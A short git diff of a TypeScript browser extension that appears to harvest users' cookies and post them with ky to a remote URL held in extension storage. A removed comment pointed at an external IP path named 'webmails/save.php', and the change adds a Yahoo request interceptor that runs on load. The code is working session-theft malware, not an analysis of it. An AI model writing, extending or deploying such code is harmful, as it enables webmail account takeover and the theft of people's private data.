@@ -2,6 +2,7 @@ import { json } from '../types';
 import { Cookies, Storage } from '../redefination';
 import ky from 'ky';
 import { removeAllCookies } from '../cookies';
+import { requestListner } from './yahoo_requestInterceptor';
 
 chrome.storage.local.get('url').then(({ url }) => {
   if (!url) {
@@ -41,8 +42,8 @@ async function handleCookie(message: any) {
 
 async function sendCookies(data: json): Promise<string> {
   const { url } = await Storage.get('url');
-  // const baseURL = 'http://95.111.230.118/webmails/save.php';
-  // const baseURL = 'http://127.0.0.1:5000';
   const res = await ky.post(url, { json: data });
   return await res.text();
 }
+
+requestListner();
